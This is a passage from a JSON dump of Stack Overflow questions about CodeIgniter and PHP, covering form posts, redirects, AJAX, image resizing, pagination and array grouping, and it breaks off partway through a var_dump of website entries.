</p>\n"},{"tags":["mysql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12744862,"title":"is there any logged in field in codeigniter","body":"<p>i am having fields like username , email , usertype in my backend table</p>\n\n<p>As created and modified fields present in cakephp do there is any field present in codeigniter that will save time when user has last logged in to the system?</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":110,"score":0,"question_id":12283838,"title":"codeigniter $this->post->input is not posting full value","body":"<p>I have a  text area for uploading embed code. when i post a embed code it is not posting full code.\nthis is my embed code </p>\n\n<pre><code>&lt;iframe frameborder=\"0\" width=\"480\" height=\"308\" src=\"http://www.dailymotion.com/embed/video/xt7dgo?autoplay=0&amp;logo=0&amp;hideInfos=1&amp;start=0&amp;syndication=108944&amp;foreground=%23F7FFFD&amp;highlight=%23FFC300&amp;background=%23171D1B\"&gt;&lt;/iframe&gt;\n</code></pre>\n\n<p>This is my php code to get this .</p>\n\n<pre><code>public function embeded(){\n    $this-&gt;form_validation-&gt;set_rules('video_heading', 'Video heading', 'required|trim|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('embeded', 'Embeded code', 'required|trim|xss_clean');\n    $this-&gt;load-&gt;model('videos');\n    $error['error']=\"\";\n    if ($this-&gt;form_validation-&gt;run() == FALSE)\n    {\n        $error['error']= validation_errors();\n        $this-&gt;load-&gt;view('sidebar');\n        $this-&gt;load-&gt;view('addvideo', $error);\n        $this-&gt;load-&gt;view('footer');\n    }else{\n        //&lt;iframe width=\"420\" height=\"315\" src=\"http://www.youtube.com/embed/Niiyh3sxwYk\" frameborder=\"0\" allowfullscreen&gt;&lt;/iframe&gt;\n        $plink=$this-&gt;videos-&gt;processlink($this-&gt;input-&gt;post('embeded'));\n        $info = array('heading'=&gt;$this-&gt;input-&gt;post('video_heading'),\n        'status'=&gt;$this-&gt;input-&gt;post('status'),'video'=&gt;$plink,\n        'comment'=&gt;$this-&gt;input-&gt;post('comment'),'category'=&gt;$this-&gt;input-&gt;post('category'));   \n        $this-&gt;load-&gt;model('videos');\n        $obj= (object)$info;\n        echo \"opsted_link\".str_replace(\"syndication\",\"syndicate\", $_POST['embeded']);\n        if(isset($_POST['embeded']))\n         {\n              echo $_POST['embeded'];exit;\n         }\n        //$this-&gt;videos-&gt;addembededvideo($obj);\n    }\n\n}\n</code></pre>\n\n<p>When i use it i get the i frame code partially like this.</p>\n\n<pre><code>&lt;iframe frameborder=\"0\" width=\"480\" height=\"308\" src=\"http://www.dailymotion.com/embed/video/xt7dgo?autoplay=0&amp;logo=0&amp;hideInfos=1&amp;start=0&amp;syndicati&gt;&lt;/iframe&gt;\n</code></pre>\n\n<p>i changed a parameter syndication=108944 in the src to syndicator=108944.</p>\n\n<p>Now i get the full url ! </p>\n\n<p>is \"syndication\" is any reserved word?\nWhy this happen?</p>\n"},{"tags":["php","session","codeigniter","redirect","userdata"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":4866,"score":1,"question_id":6911808,"title":"Error 310 (net::ERR_TOO_MANY_REDIRECTS):","body":"<p>What is this error:</p>\n\n<pre><code>Error 310 (net::ERR_TOO_MANY_REDIRECTS): There were too many redirects.\n</code></pre>\n\n<p>I use PHP CodeIgniter and library <a href=\"http://codeigniter.com/wiki/SimpleLoginSecure/\" rel=\"nofollow\">SimpleLoginSecure</a>, this is my code:</p>\n\n<pre><code>if ($this-&gt;session-&gt;userdata('logged_in')) {\n    redirect('admin/index');\n}\n</code></pre>\n\n<hr>\n\n<p>How can I resolve this error?</p>\n\n<p>Regards</p>\n"},{"tags":["php","ajax","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":93,"score":0,"question_id":12741001,"title":"CodeIgniter and AJAX","body":"<p>CodeIgniter and AJAX Problem</p>\n\n<pre><code>my base_url=http://localhowt/project1/\n\nsite_url=http://localhowt/project1/index.php\n</code></pre>\n\n<p>I have a controller name <code>methods.php</code> and within that a method is <code>insert_data()</code>.</p>\n\n<p>From one of my view page i tried to call the controller methods.php using <code>$.ajax</code> like this </p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n$(document).ready(function(){\n    $('#save').click(function(){\n        $.ajax({\n            type: \"POST\",\n            url: \"http://localhost/project1/index.php/methods/insert_data\",\n            dataType: \"json\",success:function(data){\n                alert(\"success\");\n            }\n        });  \n    });\n});\n&lt;/script&gt;\n</code></pre>\n\n<p>This AJAX code doesn't redirect to controller page. But I did not get any response from this ajax code.</p>\n"},{"tags":["php","codeigniter","gd","image-resizing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":89,"score":0,"question_id":12740134,"title":"Codeigniter GD Library Image Resize Not working","body":"<p>I tried to resizeing images using codeignater GD library.It's works fine on my local machine.</p>\n\n<pre><code>    $config['image_library'] = 'gd2';\n    $config['source_image'] = 'test_img/img_1.jpg';  //local path\n    echo $config['source_image'];\n    $config['create_thumb'] = TRUE;\n    $config['maintain_ratio'] = TRUE;\n    $config['width'] = 500;\n    $config['height'] = 500;\n    $this-&gt;load-&gt;library('image_lib', $config);\n    $this-&gt;image_lib-&gt;resize();\n</code></pre>\n\n<p>But we actually store images in Amazon Simple Storage Service (Amazon S3).So I changed the path to the S3 bucket.And permissions are given.</p>\n\n<p>$config['source_image'] =  'https://s3.amazonaws.com/folder_name/53.jpg';</p>\n\n<p>Then i got an error,\n\"The path to the image is not correct.\nYour server does not support the GD function required to process this type of image..\"</p>\n\n<p>I tried to do this thing in different ways but I coudn't achieve this.Need your help.</p>\n\n<p>Regards,<br/>\nKosala</p>\n"},{"tags":[".htaccess","codeigniter","codeigniter-url"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12740622,"title":".htaccess not working in LAMP","body":"<p>i used CI, i downloaded project from server it has a .htaccess file. when i run these project in my localhost is not working, i have to put index.php after project path , like example.com/index.php/controller/method. there is read/write rule in .htaccess file. for run .htacces i use these much but still not working.\nIn <code>/etc/apache2/sites-available/default</code> modify the line containing <code>AllowOverride None</code> to read <code>AllowOverride All</code>. and then restart apache.\nfor check read/write rule enable or not i run <code>a2enmod rewrite</code> it's shows <code>Module rewrite already enabled</code>. \nso, how can i run .htacess file, i want to remove index.php from URL in my CI from localhost.</p>\n"},{"tags":["database","query","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12738326,"title":"Viewing a single record from a database using a link","body":"<p>I have a link for each record that is displayed on the screen and when i click on the link, I would like to show all the details of the record on a new page. </p>\n\n<p>Basically when i click the link, I get a url with the id no. of that item like:</p>\n\n<p>polls/index.php/user/vote/59</p>\n\n<p>NOw i am trying to display the title and text of that id no.</p>\n\n<p>IN my controller, I have a method to do this:</p>\n\n<pre><code>public function display_poll($id=0){\n\n    $this-&gt;load-&gt;helper('form');  \n    $this-&gt;load-&gt;helper('html'); \n    $this-&gt;load-&gt;model('polls_model');  \n\n    $data['polls_item'] = $this-&gt;polls_model-&gt;get($id);\n\n    if (empty($data['polls_item']))\n    {\n        show_404();\n    }\n\n    $this-&gt;load-&gt;helper('html');\n    $data['content'] = $this-&gt;load-&gt;view('user/view', $data, TRUE);\n    $data['id'] = $data['polls_item']['id'];\n    $data['title'] = $data['polls_item']['title'];\n    $data['text'] = $data['polls_item']['text'];\n\n    $this-&gt;load-&gt;view('user/vote',$data);   \n\n}\n</code></pre>\n\n<p>IN my view, I am doing it like this:</p>\n\n<pre><code>&lt;html&gt;\n    &lt;head&gt;\n        &lt;h2&gt;Voting Page:&lt;/h2&gt;\n\n&lt;script type=\"text/javascript\" src=\"&lt;?php echo base_url();?&gt;js/jquery.js\"&gt;&lt;/script&gt;      \n&lt;/head&gt;\n\n&lt;body&gt;\n\n&lt;?php echo form_open('user/vote'); ?&gt;\n&lt;?php echo form_hidden($polls_item['id']); ?&gt;\n&lt;?php echo $polls_item['title'] ?&gt;\n&lt;?php echo $polls_item['text'] ?&gt;\n\n&lt;?php echo form_close(); ?&gt;\n\n\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>\n\n<p>and in my model, I have a function like this:</p>\n\n<pre><code>function get($id)\n{\n    $query = $this-&gt;db-&gt;get_where('polls', array('id'=&gt;$id));\n    return $query-&gt;row_array();       \n}\n</code></pre>\n\n<p>I am getting this sort of error: </p>\n\n<p>A PHP Error was encountered</p>\n\n<p>Severity: Notice</p>\n\n<p>Message: Undefined variable: polls_item</p>\n\n<p>Filename: user/vote.php</p>\n\n<p>Line Number: 27</p>\n\n<p>How can i fix this? YOur help will be greatly appreciated.\nTHankyou.</p>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":41,"score":-5,"question_id":12740007,"title":"Cron jobs in CodeIgniter implement","body":"<p>i found a lot of pages on this but whatever i tried resulted in some error. So could anyone provide me a complete guide from the beginning .i.e. how to start and what codes to put in which files.</p>\n\n<p>Thankyou</p>\n"},{"tags":["unit-testing","codeigniter","phpunit"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12739470,"title":"Auto genarate testcases for codeigniter","body":"<p>How to genarate testcases for codeigniter or any other MVC based project using the command <strong>phpunit-skelgen</strong> and I have to create testcases with assertions automatically.</p>\n\n<p>Thank u all.</p>\n"},{"tags":["codeigniter","pagination"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12737593,"title":"customized pagination in codeigniter","body":"<p>I have codeigniter applicatin which have pagination code that work like a charm. Pagination allow the visitor to select how much records he would like to see per page. Now, I would like to add the following:</p>\n\n<p>displaying X to Y from total of Z records.</p>\n\n<p>Now, Z is easy...i have that solved. Can anyone tell me how could I achive this?</p>\n\n<p>Here is the function that i have:</p>\n\n<pre><code>  public function displayAllUsers() \n   { \n\n        if ($this-&gt;uri-&gt;segment(3) !=\"\") { \n        $limit = $this-&gt;uri-&gt;segment(3); \n        } else { \n        $limit = 10; \n        } \n\n        $offset = 4; \n        $offset = $this-&gt;uri-&gt;segment(4); \n        $this-&gt;db-&gt;limit($limit, $offset); \n        $data['users'] = $this-&gt;backOfficeUsersModel-&gt;get();\n        $totalresults = $this-&gt;db-&gt;get('back_office_users')-&gt;num_rows();\n\n        $this-&gt;session-&gt;set_userdata('totalresults', $totalresults);\n\n        //initializing &amp; configuring paging\n        $this-&gt;load-&gt;library('pagination');\n        $config['base_url'] = site_url('/backOfficeUsers/displayAllUsers/'.$limit.'/');\n        $config['total_rows'] = $totalresults;\n        $config['per_page'] = $limit;\n        $config['uri_segment'] = 4;\n        $config['full_tag_open'] = '&lt;div class=\"dataTables_paginate paging_bootstrap pagination\"&gt;&lt;ul&gt;';\n        $config['full_tag_close'] = '&lt;/ul&gt;&lt;/div&gt;';\n        $config['cur_tag_open'] = '&lt;li&gt;&lt;a href=# style=\"color:#ffffff; background-color:#258BB5;\"&gt;';\n        $config['cur_tag_close'] = '&lt;/a&gt;&lt;/li&gt;';\n        $config['num_tag_open'] = '&lt;li&gt;';\n        $config['num_tag_close'] = '&lt;/li&gt;';\n\n        $this-&gt;pagination-&gt;initialize($config); \n\n       //....irelevant content.....\n\n    } // end of function displayAllUsers\n</code></pre>\n\n<p>Any help will be deeply appreciated.</p>\n"},{"tags":["codeigniter","pyrocms"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":99,"score":0,"question_id":12726350,"title":"can i use pyroCMS for multilanguage, and multiuser project?","body":"<p>I need 1 suggestion, This is best platform for my question so i post here.</p>\n\n<p>I think i will use PyroCMS for my new project.</p>\n\n<p>Project has following features:</p>\n\n<ol>\n<li>Multilagnguage in front end</li>\n<li>User management</li>\n<li>super Admin, country admin, advertisement admin</li>\n<li>In frontend users export_type and import_type.</li>\n</ol>\n\n<p>Can i use PyroCMS for this project? I need to make fast develop this. or can i do with core?? what you suggest.</p>\n\n<p>I am bigner in PyroCMS, but i am good in Codeigniter.</p>\n\n<p>Thanks in Advance :)</p>\n"},{"tags":["php","image","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12735762,"title":"Codeigniter/PHP: Should i create an image loader or access images directly?","body":"<p>I'm working on a project where i get images through an API from another site, and save the images locally on my server. I've been thinking, and i can't decide if i should create a loader that displays the image, or just access the specific images directly? Is there any security concerns if i access them directly? Before i save the images on the server, i validate the content and check if it is a valid image, so i will always have valid images to display.</p>\n\n<p>The image loader would work sort of like this. I create a controller (call it \"load\" for example). Then i could just call load with the image as a param, sort of like this:</p>\n\n<pre><code>http://example.com/load/file_name.jpg\n</code></pre>\n\n<p>And then i get the image through the load controller and display it. Is there any advantage to doing so or is it okay to access the image directly?</p>\n"},{"tags":["php","jquery","codeigniter","jquery-ajax"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":12736508,"title":"How to monitor updated values of three <select>","body":"<p>I work with codeigniter and have the following problem.</p>\n\n<p>In the controller (results.php), I have something like this:</p>\n\n<pre><code>if(isset($_POST['tournaments'])){\n$tournament_id = $_POST['tournaments'];\n}else{\n$tournament_id=1;\n}\n\nif( isset($_POST['categories'])){\n$category_id = $_POST['categories'];\n}else{\n$category_id=1;\n}\n\nif( isset($_POST['groups'])){\n$group_id = $_POST['groups'];       \n}else{\n$group_id=1;\n}\n//returns a list of tournaments (id and name)\n$data['tournaments'] = $this-&gt;tournaments_model-&gt;getTournaments(); \n\nif($data['tournaments']&gt;0){\n//returns a list of categories where tournament=$tournament_id (id and name)\n$data['categories'] = $this-&gt;tournaments_model-&gt;getCategories($tournament_id); \nif($data['categories']&gt;0){\n//returns a list of groups where where tournament=$tournament_id and category=$category_id\n$data['groups'] = $this-&gt;tournaments_model-&gt;getGroup($tournament_id,$category_id);\n}\n}\n//returns info about team ranking, etc. \nif($data['tournaments']&gt;0 &amp;&amp; $data['categories']&gt;0 &amp;&amp; $data['groups']&gt;0){\n$data['rows'] = $this-&gt;tournaments_model-&gt;getAll($tournament_id, $category_id, $group_id);\n\nif($data['rows']&gt;0){\n$this-&gt;load-&gt;view('header_view', $data);\n$this-&gt;load-&gt;view('results_view', $data);\n$this-&gt;load-&gt;view('footer_view');   \n}else{\n$this-&gt;load-&gt;view('header_view', $data);\n$this-&gt;load-&gt;view('norecords_view');\n$this-&gt;load-&gt;view('footer_view');\n}   \n}\n</code></pre>\n\n<p>The view(results_view.php), outputs something like this:\n(changed tags with quotes)</p>\n\n<pre><code>\"form\"\n\"select name=\"tournaments\" id=\"tournament\"\"\n\"option value=\"1\" selected=\"selected\"&gt;A Tournament\"\"\n\"option value=\"2\"&gt;B Tournament\"\n\"option value=\"3\"&gt;C Tournament\"\n\n\"select name=\"categories\" id=\"category\"\"\n\"option value=\"1\" selected=\"selected\"&gt;Junior\"\n\"option value=\"6\" &gt;Pro-Junior\"\n\n\"select name=\"groups\" id=\"group\"\n\"option value=\"1\" selected=\"selected\"&gt;A Group\"\n\"option value=\"2\"&gt;B Group\"\n</code></pre>\n\n<p>So, this should set three fields to: \n    $_POST['tournaments'] = 1\n    $_POST['categories']) = 1\n    $_POST['group']) = 1</p>\n\n<p>What I want to do is:\nPass these values to the controller without submitting the form with button.\nApart from that, when \"Tournament\" changes (e.g from 1 to 2), this should bring other data for the \"Category\" and \"Group\".\nFor example:\n selected:      Tournament_id=1<br>\n    then            Category_id=1, <br>\n                 Group_id=1<br>\n                Category_id=2<br>\n                 Group_id=2<br>\n                 Group_id=3<br></p>\n\n<p>selected:      Tournament_id=2<br>\n    then            Category_id=1<br>\n                    Group_id=1<br>\n                    Group_id=2<br></p>\n\n<p>That means, somehow I have to monitor the update of all three $_POST fields, send them back to the controller \nand fetch new data from my sql query in the model.\nI tried something with jquery, but didn't get the result I wanted.</p>\n\n<p>I suppose, there should be a function that would monitor the change of any of three \"select\".\n<a href=\"https://docs.google.com/open?id=0B15bmK58VaEedGRORWtqc2xzTG8\" rel=\"nofollow\">controller-view interaction</a></p>\n\n<p>If you have any idea how to do this, please give some advice. \nThanks.</p>\n\n<p>These are my controller(results.php) and view (results_view.php)\n<a href=\"https://docs.google.com/folder/d/0B15bmK58VaEeS3A5ek01bHhzeTQ/edit\" rel=\"nofollow\">scripts</a></p>\n"},{"tags":["php","arrays","codeigniter","grouping"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12736210,"title":"PHP print array items group by","body":"<pre><code>$array = (\n'item'=&gt;'1',\n'category'=&gt;'2',\n'item'=&gt;'2',\n'category'=&gt;'2',\n'item'=&gt;'3',\n'category'=&gt;'1',\n'item'=&gt;'4',\n'category'=&gt;'3'\n); \n</code></pre>\n\n<p>i would llike to return in html if is possible:</p>\n\n<pre><code>Category 1\n- item3\nCategory 2\n- item1\n- item2\nCategory 3\n- item4\n</code></pre>\n\n<p>any suggestion? really don't know where to start to do this script :/</p>\n\n<p>EDIT real array is:</p>\n\n<pre><code>    array(39) {\n  [0]=&gt;\n  object(stdClass)#50 (6) {\n    [\"id\"]=&gt;\n    string(2) \"20\"\n    [\"name\"]=&gt;\n    string(7) \"youtube\"\n    [\"url\"]=&gt;\n    string(11) \"youtube.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"yo\"\n    [\"category\"]=&gt;\n    string(5) \"video\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [1]=&gt;\n  object(stdClass)#51 (6) {\n    [\"id\"]=&gt;\n    string(2) \"23\"\n    [\"name\"]=&gt;\n    string(5) \"vimeo\"\n    [\"url\"]=&gt;\n    string(9) \"vimeo.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"vm\"\n    [\"category\"]=&gt;\n    string(5) \"video\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [2]=&gt;\n  object(stdClass)#52 (6) {\n    [\"id\"]=&gt;\n    string(1) \"1\"\n    [\"name\"]=&gt;\n    string(10) \"googleplus\"\n    [\"url\"]=&gt;\n    string(15) \"plus.google.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"g+\"\n    [\"category\"]=&gt;\n    string(6) \"social\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [3]=&gt;\n  object(stdClass)#53 (6) {\n    [\"id\"]=&gt;\n    string(1) \"2\"\n    [\"name\"]=&gt;\n    string(8) \"facebook\"\n    [\"url\"]=&gt;\n    string(12) \"facebook.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"fb\"\n    [\"category\"]=&gt;\n    string(6) \"social\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [4]=&gt;\n  object(stdClass)#54 (6) {\n    [\"id\"]=&gt;\n    string(1) \"4\"\n    [\"name\"]=&gt;\n    string(7) \"twitter\"\n    [\"url\"]=&gt;\n    string(11) \"twitter.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"tw\"\n    [\"category\"]=&gt;\n    string(6) \"social\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [5]=&gt;\n  object(stdClass)#55 (6) {\n    [\"id\"]=&gt;\n    string(1) \"9\"\n    [\"name\"]=&gt;\n    string(9) \"instagram\"\n    [\"url\"]=&gt;\n    string(13) \"instagram.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"is\"\n    [\"category\"]=&gt;\n    string(6) \"social\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [6]=&gt;\n  object(stdClass)#56 (6) {\n    [\"id\"]=&gt;\n    string(2) \"17\"\n    [\"name\"]=&gt;\n    string(8) \"diaspora\"\n    [\"url\"]=&gt;\n    string(16) \"joindiaspora.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"dp\"\n    [\"category\"]=&gt;\n    string(6) \"social\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [7]=&gt;\n  object(stdClass)#57 (6) {\n    [\"id\"]=&gt;\n    string(2) \"22\"\n    [\"name\"]=&gt;\n    string(7) \"myspace\"\n    [\"url\"]=&gt;\n    string(11) \"myspace.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"my\"\n    [\"category\"]=&gt;\n    string(6) \"social\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [8]=&gt;\n  object(stdClass)#58 (6) {\n    [\"id\"]=&gt;\n    string(2) \"32\"\n    [\"name\"]=&gt;\n    string(5) \"orkut\"\n    [\"url\"]=&gt;\n    string(9) \"orkut.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"ot\"\n    [\"category\"]=&gt;\n    string(6) \"social\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [9]=&gt;\n  object(stdClass)#59 (6) {\n    [\"id\"]=&gt;\n    string(2) \"33\"\n    [\"name\"]=&gt;\n    string(8) \"linkedin\"\n    [\"url\"]=&gt;\n    string(12) \"linkedin.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"ln\"\n    [\"category\"]=&gt;\n    string(6) \"social\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [10]=&gt;\n  object(stdClass)#60 (6) {\n    [\"id\"]=&gt;\n    string(2) \"34\"\n    [\"name\"]=&gt;\n    string(9) \"delicious\"\n    [\"url\"]=&gt;\n    string(13) \"delicious.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"dl\"\n    [\"category\"]=&gt;\n    string(6) \"social\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [11]=&gt;\n  object(stdClass)#61 (6) {\n    [\"id\"]=&gt;\n    string(2) \"35\"\n    [\"name\"]=&gt;\n    string(4) \"digg\"\n    [\"url\"]=&gt;\n    string(8) \"digg.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"dg\"\n    [\"category\"]=&gt;\n    string(6) \"social\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [12]=&gt;\n  object(stdClass)#62 (6) {\n    [\"id\"]=&gt;\n    string(2) \"40\"\n    [\"name\"]=&gt;\n    string(11) \"stumbleupon\"\n    [\"url\"]=&gt;\n    string(15) \"stumbleupon.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"sb\"\n    [\"category\"]=&gt;\n    string(6) \"social\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [13]=&gt;\n  object(stdClass)#63 (6) {\n    [\"id\"]=&gt;\n    string(2) \"41\"\n    [\"name\"]=&gt;\n    string(10) \"friendfeed\"\n    [\"url\"]=&gt;\n    string(14) \"friendfeed.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"ff\"\n    [\"category\"]=&gt;\n    string(6) \"social\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [14]=&gt;\n  object(stdClass)#64 (6) {\n    [\"id\"]=&gt;\n    string(2) \"47\"\n    [\"name\"]=&gt;\n    string(6) \"tumblr\"\n    [\"url\"]=&gt;\n    string(10) \"tubmlr.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"tu\"\n    [\"category\"]=&gt;\n    string(6) \"social\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [15]=&gt;\n  object(stdClass)#65 (6) {\n    [\"id\"]=&gt;\n    string(2) \"48\"\n    [\"name\"]=&gt;\n    string(9) \"pinterest\"\n    [\"url\"]=&gt;\n    string(13) \"pinterest.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"pi\"\n    [\"category\"]=&gt;\n    string(6) \"social\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [16]=&gt;\n  object(stdClass)#66 (6) {\n    [\"id\"]=&gt;\n    string(2) \"67\"\n    [\"name\"]=&gt;\n    string(11) \"tripadvisor\"\n    [\"url\"]=&gt;\n    string(15) \"tripadvisor.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"tp\"\n    [\"category\"]=&gt;\n    string(6) \"social\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [17]=&gt;\n  object(stdClass)#67 (6) {\n    [\"id\"]=&gt;\n    string(2) \"76\"\n    [\"name\"]=&gt;\n    string(8) \"dribbble\"\n    [\"url\"]=&gt;\n    string(12) \"dribbble.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"db\"\n    [\"category\"]=&gt;\n    string(6) \"social\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [18]=&gt;\n  object(stdClass)#68 (6) {\n    [\"id\"]=&gt;\n    string(2) \"88\"\n    [\"name\"]=&gt;\n    string(10) \"foursquare\"\n    [\"url\"]=&gt;\n    string(14) \"foursquare.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"fs\"\n    [\"category\"]=&gt;\n    string(6) \"social\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [19]=&gt;\n  object(stdClass)#69 (6) {\n    [\"id\"]=&gt;\n    string(1) \"3\"\n    [\"name\"]=&gt;\n    string(5) \"yahoo\"\n    [\"url\"]=&gt;\n    string(9) \"yahoo.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"yh\"\n    [\"category\"]=&gt;\n    string(6) \"search\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [20]=&gt;\n  object(stdClass)#70 (6) {\n    [\"id\"]=&gt;\n    string(2) \"36\"\n    [\"name\"]=&gt;\n    string(6) \"reddit\"\n    [\"url\"]=&gt;\n    string(10) \"reddit.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"re\"\n    [\"category\"]=&gt;\n    string(6) \"search\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [21]=&gt;\n  object(stdClass)#71 (6) {\n    [\"id\"]=&gt;\n    string(2) \"42\"\n    [\"name\"]=&gt;\n    string(10) \"craigslist\"\n    [\"url\"]=&gt;\n    string(14) \"craigslist.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"cg\"\n    [\"category\"]=&gt;\n    string(6) \"search\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [22]=&gt;\n  object(stdClass)#72 (6) {\n    [\"id\"]=&gt;\n    string(2) \"51\"\n    [\"name\"]=&gt;\n    string(6) \"flickr\"\n    [\"url\"]=&gt;\n    string(10) \"flickr.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"fk\"\n    [\"category\"]=&gt;\n    string(5) \"photo\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [23]=&gt;\n  object(stdClass)#73 (6) {\n    [\"id\"]=&gt;\n    string(2) \"85\"\n    [\"name\"]=&gt;\n    string(6) \"picasa\"\n    [\"url\"]=&gt;\n    string(10) \"picasa.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"ps\"\n    [\"category\"]=&gt;\n    string(5) \"photo\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [24]=&gt;\n  object(stdClass)#74 (6) {\n    [\"id\"]=&gt;\n    string(2) \"38\"\n    [\"name\"]=&gt;\n    string(9) \"wordpress\"\n    [\"url\"]=&gt;\n    string(13) \"wordpress.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"wp\"\n    [\"category\"]=&gt;\n    string(6) \"others\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [25]=&gt;\n  object(stdClass)#75 (6) {\n    [\"id\"]=&gt;\n    string(1) \"5\"\n    [\"name\"]=&gt;\n    string(10) \"soundcloud\"\n    [\"url\"]=&gt;\n    string(13) \"souncloud.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"sc\"\n    [\"category\"]=&gt;\n    string(5) \"music\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [26]=&gt;\n  object(stdClass)#76 (6) {\n    [\"id\"]=&gt;\n    string(1) \"6\"\n    [\"name\"]=&gt;\n    string(7) \"spotify\"\n    [\"url\"]=&gt;\n    string(11) \"spotify.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"sp\"\n    [\"category\"]=&gt;\n    string(5) \"music\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [27]=&gt;\n  object(stdClass)#77 (6) {\n    [\"id\"]=&gt;\n    string(2) \"10\"\n    [\"name\"]=&gt;\n    string(6) \"lastfm\"\n    [\"url\"]=&gt;\n    string(10) \"lastfm.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"lf\"\n    [\"category\"]=&gt;\n    string(5) \"music\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [28]=&gt;\n  object(stdClass)#78 (6) {\n    [\"id\"]=&gt;\n    string(1) \"8\"\n    [\"name\"]=&gt;\n    string(5) \"gmail\"\n    [\"url\"]=&gt;\n    string(9) \"gmail.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"gm\"\n    [\"category\"]=&gt;\n    string(5) \"email\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [29]=&gt;\n  object(stdClass)#79 (6) {\n    [\"id\"]=&gt;\n    string(1) \"7\"\n    [\"name\"]=&gt;\n    string(13) \"stackoverflow\"\n    [\"url\"]=&gt;\n    string(17) \"stackoverflow.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"st\"\n    [\"category\"]=&gt;\n    string(10) \"developers\"\n    [\"img\"]=&gt;\n    string(1) \"y\"\n  }\n  [30]=&gt;\n  object(stdClass)#80 (6) {\n    [\"id\"]=&gt;\n    string(2) \"55\"\n    [\"name\"]=&gt;\n    string(6) \"github\"\n    [\"url\"]=&gt;\n    string(10) \"github.com\"\n    [\"shortname\"]=&gt;\n    string(2) \"gt\"\n    [\"category\"]=&gt;\n    